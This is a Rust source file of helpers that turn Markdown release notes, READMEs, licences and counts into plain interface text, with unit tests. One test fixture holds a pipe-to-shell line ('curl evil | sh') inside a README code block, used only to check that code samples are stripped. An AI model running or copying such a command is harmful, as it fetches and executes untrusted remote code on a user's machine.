//! Turning what sources send (Markdown, licences, counts, dates) into plain words for
//! the interface.

use crate::i18n;
use bilby_core::model::human_count;
use slint::SharedString;

/// Letters and digits only, lower-cased, for comparing an app's name with a package's.
pub(crate) fn plain(text: &str) -> String {
    text.chars().filter(|c| c.is_alphanumeric()).flat_map(char::to_lowercase).collect()
}

pub(crate) fn initials(name: &str) -> String {
    let words: Vec<&str> = name.split(|c: char| !c.is_alphanumeric()).filter(|w| !w.is_empty()).collect();
    let letters: String = match words.as_slice() {
        [] => "?".to_string(),
        [one] => one.chars().take(2).collect(),
        [first, second, ..] => first.chars().take(1).chain(second.chars().take(1)).collect(),
    };
    let mut chars = letters.chars();
    match (chars.next(), chars.next()) {
        (Some(a), Some(b)) => format!("{}{}", a.to_uppercase(), b.to_lowercase()),
        (Some(a), None) => a.to_uppercase().to_string(),
        _ => "?".to_string(),
    }
}

/// "821 ratings", "12k ratings": how many people rated an app.
pub(crate) fn ratings_text(count: u32) -> String {
    if count == 1 {
        "1 rating".to_string()
    } else {
        format!("{} ratings", human_count(count as u64))
    }
}

/// The opening of a README as plain text: what the project says it is, without the
/// title (the page already shows it), badges, pictures, tables or code samples.
pub(crate) fn plain_about(markdown: &str) -> String {
    const LIMIT: usize = 900;
    let mut kept = Vec::new();
    let (mut in_code, mut title_dropped) = (false, false);
    for line in markdown.lines() {
        let start = line.trim_start();
        if start.starts_with("```") || start.starts_with("~~~") {
            in_code = !in_code;
            continue;
        }
        if in_code || start.starts_with('|') {
            continue;
        }
        if !title_dropped && start.starts_with("# ") {
            title_dropped = true;
            continue;
        }
        kept.push(line);
    }
    let text = plain_notes(&kept.join("\n"));
    if text.chars().count() <= LIMIT {
        return text;
    }
    // Stop at the end of a line rather than mid-sentence.
    let cut: String = text.chars().take(LIMIT).collect();
    let end = cut.rfind('\n').filter(|&i| i > LIMIT / 2).unwrap_or(cut.len());
    format!("{}\n…", cut[..end].trim_end())
}

pub(crate) fn plain_notes(markdown: &str) -> String {
    let mut out = String::new();
    let mut blank_run = 0;
    for line in markdown.lines() {
        let line = strip_inline_markup(line.trim_end());
        let trimmed = line.trim_start();
        let indent = line.len() - trimmed.len();
        let text = trimmed.trim_start_matches('#').trim_start();
        let text = match text.strip_prefix("- ").or_else(|| text.strip_prefix("* ")).or_else(|| text.strip_prefix("+ "))
        {
            Some(item) => format!("{}•  {item}", " ".repeat(indent.min(6))),
            None => text.to_string(),
        };
        // Horizontal rules and now-empty lines collapse into a single blank line.
        let text = if text.chars().all(|c| matches!(c, '-' | '=' | '_' | '*' | ' ')) { String::new() } else { text };
        if text.is_empty() {
            blank_run += 1;
            if blank_run > 1 || out.is_empty() {
                continue;
            }
        } else {
            blank_run = 0;
        }
        out.push_str(&text);
        out.push('\n');
        if out.len() > 2400 {
            out.push('…');
            break;
        }
    }
    out.trim().to_string()
}

/// `[words](url)` -> `words`, `![alt](url)` -> nothing, `<tag>` -> nothing, and the
/// emphasis markers `**`, `__` and backticks are dropped.
pub(crate) fn strip_inline_markup(line: &str) -> String {
    let chars: Vec<char> = line.chars().collect();
    let mut out = String::with_capacity(line.len());
    let mut i = 0;
    while i < chars.len() {
        let c = chars[i];
        // A picture that is also a link (`[![alt](picture)](target)`, the shape of every
        // badge) disappears entirely.
        if c == '[' && chars.get(i + 1) == Some(&'!') && chars.get(i + 2) == Some(&'[') {
            let find = |from: usize, what: char| (from..chars.len()).find(|&j| chars[j] == what);
            let whole = find(i + 3, ']')
                .filter(|&alt| chars.get(alt + 1) == Some(&'('))
                .and_then(|alt| find(alt + 2, ')'))
                .filter(|&picture| chars.get(picture + 1) == Some(&']') && chars.get(picture + 2) == Some(&'('))
                .and_then(|picture| find(picture + 3, ')'));
            if let Some(end) = whole {
                i = end + 1;
                continue;
            }
        }
        let image = c == '!' && chars.get(i + 1) == Some(&'[');
        if c == '[' || image {
            let open = if image { i + 1 } else { i };
            if let Some(close) = (open + 1..chars.len()).find(|&j| chars[j] == ']') {
                if chars.get(close + 1) == Some(&'(') {
                    if let Some(end) = (close + 2..chars.len()).find(|&j| chars[j] == ')') {
                        if !image {
                            out.extend(&chars[open + 1..close]);
                        }
                        i = end + 1;
                        continue;
                    }
                }
            }
        }
        if c == '<' {
            // An HTML tag or an autolink; a lone "<" in prose is kept.
            if let Some(end) = (i + 1..chars.len()).find(|&j| chars[j] == '>') {
                let inner: String = chars[i + 1..end].iter().collect();
                if inner.starts_with("http") {
                    out.push_str(&inner);
                    i = end + 1;
                    continue;
                }
                let tag_like = inner.starts_with('/')
                    || inner.starts_with('!')
                    || inner.chars().next().is_some_and(|c| c.is_ascii_alphabetic());
                if tag_like && !inner.contains('<') {
                    i = end + 1;
                    continue;
                }
            }
        }
        if c == '`' || (c == '*' && chars.get(i + 1) == Some(&'*')) || (c == '_' && chars.get(i + 1) == Some(&'_')) {
            i += if c == '`' { 1 } else { 2 };
            continue;
        }
        out.push(c);
        i += 1;
    }
    out
}

pub(crate) fn plural(n: usize, word: &str) -> String {
    i18n::trn(&format!("{{n}} {word}"), &format!("{{n}} {word}s"), n)
}

/// Text on its way to the screen, in the language in use.
pub(crate) fn l(text: impl AsRef<str>) -> SharedString {
    i18n::tr(text.as_ref()).into()
}

/// Web addresses in a piece of text, in the order they appear: each once, at most six,
/// without the full stop or bracket that happened to follow.
pub fn links_in(text: &str) -> Vec<String> {
    let mut links: Vec<String> = Vec::new();
    for word in text.split(|c: char| c.is_whitespace() || matches!(c, '<' | '>' | '"' | '(' | '[' | ']')) {
        let Some(start) = word.find("https://").or_else(|| word.find("http://")) else { continue };
        let link = word[start..].trim_end_matches(['.', ',', ';', ':', '!', '?', ')', '\'', '*', '`']);
        let host = link.split("://").nth(1).unwrap_or("").split('/').next().unwrap_or("");
        if host.contains('.') && link.len() <= 300 && !links.iter().any(|seen| seen == link) {
            links.push(link.to_string());
        }
        if links.len() == 6 {
            break;
        }
    }
    links
}

/// Which row of a search an app belongs in, by where it comes from.
pub(crate) fn kind_of(id: &str) -> &'static str {
    match id.split(':').next().unwrap_or("") {
        "steam" => "Games",
        "web" => "Web apps",
        "github" | "gitlab" | "codeberg" => "From developers",
        "apt" | "pacman" | "dnf" | "zypper" | "aur" => "System packages",
        "own" => "From your own sources",
        _ => "Apps",
    }
}

/// In place of an address: this picture is the website's own, found at the site.
/// A licence as a person would say it. Flathub writes one that is not open as
/// `LicenseRef-proprietary=<address of the terms>`, which is for machines.
pub(crate) fn plain_licence(licence: &str) -> String {
    match licence.strip_prefix("LicenseRef-") {
        Some(rest) if rest.to_ascii_lowercase().starts_with("proprietary") => "Proprietary".to_string(),
        Some(rest) => rest.split('=').next().unwrap_or(rest).to_string(),
        None => licence.to_string(),
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn initials_from_names() {
        assert_eq!(initials("Tidewave"), "Ti");
        assert_eq!(initials("fern-launcher"), "Fl");
        assert_eq!(initials("bat"), "Ba");
        assert_eq!(initials("x"), "X");
        assert_eq!(initials(""), "?");
    }

    #[test]
    fn notes_lose_their_markdown() {
        assert_eq!(plain_notes("## New\n\n- **Fast** `startup`\n* Fixes"), "New\n\n•  Fast startup\n•  Fixes");
    }

    #[test]
    fn notes_keep_their_words_and_lose_their_plumbing() {
        let notes = "<!-- generated -->\r\n# What's Changed\r\n\r\n\r\n* Fix crash by [@someone](https://github.com/someone) in [#12](https://github.com/a/b/pull/12)\r\n  - nested __point__\r\n\r\n![screenshot](https://example.com/x.png)\r\n\r\n---\r\n<details><summary>More</summary>\r\n\r\nSee <https://example.com/changelog> if a < b.\r\n</details>\r\n**Full Changelog**: https://github.com/a/b/compare/v1...v2";
        assert_eq!(
            plain_notes(notes),
            "What's Changed\n\n•  Fix crash by @someone in #12\n  •  nested point\n\nMore\n\nSee https://example.com/changelog if a < b.\n\nFull Changelog: https://github.com/a/b/compare/v1...v2"
        );
        assert_eq!(plain_notes(""), "");
        assert_eq!(plain_notes("[unclosed link and <odd"), "[unclosed link and <odd");
        assert_eq!(plain_notes("snake_case_name and 2 * 3"), "snake_case_name and 2 * 3");
        // Very long notes are cut, not dumped.
        let long = "word ".repeat(5000);
        assert!(plain_notes(&long).chars().count() < 30_000);
        assert!(plain_notes(&"line\n".repeat(5000)).ends_with('…'));
    }

    #[test]
    fn a_readme_becomes_a_short_plain_description() {
        let readme = "<p align=\"center\"><img src=\"logo.png\"></p>\n\n# Thing\n\n[![build](b.svg)](ci)\n\nThing does **one** job well.\n\n## Install\n\n```sh\ncurl evil | sh\n```\n\n| a | b |\n|---|---|\n\n- Fast\n- See the [docs](https://x.invalid)\n";
        let about = plain_about(readme);
        assert_eq!(about, "Thing does one job well.\n\nInstall\n\n•  Fast\n•  See the docs");
        let long = format!("# T\n\n{}", "A sentence of filler text here.\n\n".repeat(80));
        let cut = plain_about(&long);
        assert!(
            cut.chars().count() <= 902 && cut.ends_with("here.\n…"),
            "cut at a line end: {:?}",
            &cut[cut.len() - 20..]
        );
        assert_eq!(plain_about(""), "");
    }
}
